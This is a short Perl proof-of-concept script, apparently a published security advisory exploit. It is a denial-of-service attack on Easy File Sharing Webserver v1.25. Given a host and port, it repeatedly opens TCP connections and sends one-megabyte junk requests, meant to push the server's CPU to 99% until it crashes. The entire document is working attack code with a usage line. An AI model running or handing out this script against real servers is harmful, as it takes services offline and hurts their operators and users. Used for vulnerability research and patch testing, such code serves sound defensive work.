
#!/usr/bin/perl
#####################################################
# Easy File Sharing Webserver v1.25 Denial Of Service
# Proof Of Concept Code By GulfTech Security Research
#####################################################
# Easy File Sharing Webserver v1.25 will consume 99%
# of CPU usage until it crashes when sent large req's
#####################################################

use IO::Socket;

print "=====================================================\n".
      " Easy File Sharing Webserver v1.25 Denial Of Service \n".
	  "=====================================================\n";

unless (@ARGV > 1) { die("usage: efswsdos.pl host port"); }

	my $remote_host = $ARGV[0];
	my $remote_port = $ARGV[1];
	my $done = "\015\012\015\012";
	my $buff = "A" x 1000000;
	my $requested = $buff.$done;

	print "[*] DoS'ing Server $remote_host Press ctrl+c to stop\n";

	while ($requested) {
	for (my $i=1; $i<10; $i++) {
	my $i = IO::Socket::INET->new( Proto => "tcp",
							       PeerAddr  => $remote_host,
								   PeerPort  => $remote_port,
							       Timeout   => '10000',
							       Type      => SOCK_STREAM,
							      ) || die("[*] The Server Has Been Killed!");

	print $i $requested;
	$i->autoflush(1);
   }
}
	close $remote;

